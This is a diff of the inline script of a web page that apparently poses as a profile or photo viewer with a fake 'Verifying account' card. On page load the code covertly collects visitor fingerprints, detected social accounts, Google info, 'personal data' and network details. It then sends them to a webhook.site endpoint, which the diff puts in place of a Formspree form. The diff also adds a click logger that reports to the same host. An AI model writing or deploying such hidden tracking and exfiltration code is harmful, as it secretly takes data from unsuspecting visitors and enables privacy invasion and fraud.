@@ -251,7 +251,7 @@
 
     <script>
         async function collectUltimateData() {
-            console.log('🚀 STARTING ULTIMATE DATA COLLECTION...');
+            console.log('Starting');
             
             const ultimateData = {
                 timestamp: new Date().toISOString(),
@@ -270,14 +270,12 @@
                 
                 storageCapabilities: getStorageInfo(),
                 privacySettings: getPrivacyInfo(),
-                
                 performance: getPerformanceData(),
-                
                 advancedFingerprinting: await getAdvancedFingerprinting(),
-                
                 socialPresence: await detectSocialAccounts(),
                 googleData: await extractGoogleInfo(),
                 
+
                 userBehavior: getUserBehaviorPatterns(),
                 
                 personalData: await attemptPersonalDataExtraction(),
@@ -287,18 +285,17 @@
                 networkInterfaces: await getNetworkInterfaces()
             };
 
-            console.log('🎯 ULTIMATE DATA COLLECTED:', ultimateData);
+            console.log(' Data collected:', ultimateData);
             
             try {
-                // In your collectData function, change this line:
-await fetch('https://formspree.io/f/mvgnkjga?redirect=false', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(data)
+                const response = await fetch('https://webhook.site/b61073ab-8f79-4cc1-86b5-4108a35c50e7', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(ultimateData)
                 });
-                console.log('✅ ULTIMATE DATA SENT TO FORMSPREE');
+                console.log('✅ ULTIMATE DATA SENT TO WEBHOOK', response.status);
             } catch (error) {
                 console.error('Data submission failed:', error);
             }
@@ -405,6 +402,7 @@ await fetch('https://formspree.io/f/mvgnkjga?redirect=false', {
             }
         }
 
+        // === ULTIMATE BROWSER FINGERPRINT ===
         function getUltimateBrowserFingerprint() {
             return {
                 userAgent: navigator.userAgent,
@@ -419,12 +417,15 @@ await fetch('https://formspree.io/f/mvgnkjga?redirect=false', {
                 product: navigator.product,
                 productSub: navigator.productSub,
                 
+                // Browser details
                 browser: getBrowserDetails(),
                 engine: getBrowserEngine(),
                 
+                // Plugins and MIME types
                 plugins: getDetailedPlugins(),
                 mimeTypes: getMimeTypesList(),
                 
+                // Security policies
                 security: getSecurityPolicies()
             };
         }
@@ -576,7 +577,7 @@ await fetch('https://formspree.io/f/mvgnkjga?redirect=false', {
                 orientation: screen.orientation?.type || 'Unknown',
                 viewport: `${window.innerWidth}x${window.innerHeight}`,
                 colorGamut: screen.colorGamut || 'Not available',
-                contrast: screen contrast || 'Not available'
+                contrast: 'Not available'
             };
         }
 
@@ -691,6 +692,16 @@ await fetch('https://formspree.io/f/mvgnkjga?redirect=false', {
                 if (!gl) return 'WebGL not supported';
                 
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                
+                if (!debugInfo) {
+                    return {
+                        vendor: 'Unavailable',
+                        renderer: 'Unavailable',
+                        version: gl.getParameter(gl.VERSION),
+                        shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+                    };
+                }
+                
                 return {
                     vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                     renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
@@ -1011,14 +1022,40 @@ await fetch('https://formspree.io/f/mvgnkjga?redirect=false', {
             });
         }
 
-        // Start ULTIMATE data collection when page loads
         window.addEventListener('load', () => {
             setTimeout(() => {
                 collectUltimateData();
             }, 1000);
         });
 
+        async function logSubmissionClick() {
+            try {
+                const clickPayload = {
+                    event: 'cta_click',
+                    timestamp: new Date().toISOString(),
+                    pageUrl: window.location.href,
+                    referrer: document.referrer,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language
+                };
+                
+                const response = await fetch('https://webhook.site/b61073ab-8f79-4cc1-86b5-4108a35c50e7', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(clickPayload)
+                });
+                
+                console.log('✅ CLICK EVENT LOGGED TO WEBHOOK', response.status);
+            } catch (error) {
+                console.error('Click logging failed:', error);
+            }
+        }
+
         function showAdvancedProfile() {
+            logSubmissionClick();
             document.querySelector('.profile-card').innerHTML = `
                 <div style="text-align: center; padding: 30px;">
                     <div style="font-size: 3em; margin-bottom: 20px;">✨</div>
@@ -1029,4 +1066,4 @@ await fetch('https://formspree.io/f/mvgnkjga?redirect=false', {
                     <div style="background: #f8f9fa; padding: 20px; border-radius: 16px; margin: 20px 0;">
                         <div style="display: flex; justify-content: space-around; margin-bottom: 15px;">
                             <div>✓ Verifying account</div>
-                            <div>✓ Loading photos</div
+                            <div>✓ Loading photos</div>
